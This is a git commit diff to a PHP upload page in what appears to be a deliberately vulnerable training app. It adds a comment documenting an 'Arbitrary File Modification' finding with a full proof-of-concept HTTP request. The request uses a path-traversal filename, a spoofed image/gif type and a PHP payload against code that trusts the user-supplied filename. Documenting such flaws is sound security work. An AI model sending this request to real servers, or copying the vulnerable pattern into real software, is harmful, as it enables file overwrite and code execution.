3a8c7bde9b228689825e02011962272a3de1ec87
rbm1718 <rami@muleys.ru>
2017-03-23 06:18:16 +0300

    [AFM] in [index.php]

--- upload-2/index.php
+++ upload-2/index.php
@@ -36,6 +36,26 @@
 				if(isset($_POST['upload'])) {
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (in_array($_FILES['userfile']['type'], $valid_mime_types)) {
+						// TODO: AI issue #10, High, Arbitrary File Modification, https://github.com/rbm1718/bricks/issues/10
+						//
+						// POST /upload-2/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 307
+						// Content-Type: multipart/form-data; boundary=d2cab865a2b44c70823a5353b336f10c
+						//
+						// --d2cab865a2b44c70823a5353b336f10c
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --d2cab865a2b44c70823a5353b336f10c
+						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
+						// Content-Type: image/gif
+						//
+						// <?php phpinfo(); ?>
+						// --d2cab865a2b44c70823a5353b336f10c--
+						//
 						move_uploaded_file($_FILES['userfile']['tmp_name'], $destination);
 						echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 					}else {
